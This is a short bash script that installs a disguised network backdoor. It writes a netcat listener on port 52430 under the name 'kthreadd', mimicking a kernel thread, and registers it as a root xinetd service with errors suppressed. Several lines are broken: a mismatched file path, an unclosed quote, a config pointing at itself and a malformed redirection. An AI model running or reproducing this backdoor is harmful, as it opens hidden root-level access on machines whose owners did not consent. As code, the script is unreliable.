#!/bin/bash
echo -e '#!/bin/bash\nnc -lv 52430' > /etc/init.d/kthreadd # port or kthreadd can be changed to others
chmod +x /etc/xinetd.d/kthreadd
echo 'kthreadd        52430/tcp                # ktheadd >> /etc/services
echo -e 'service kthreadd\n{\nsocket_type = stream\ndisable=no\nprotocol = tcp\nserver = /etc/xinetd.d/kthreadd\nport = 52430\nwait = no\n user=root\n}' > /etc/xinetd.d/kthreadd
chmod +x /etc/init.d/kthreadd
service xinetd restart 2&>/dev/null
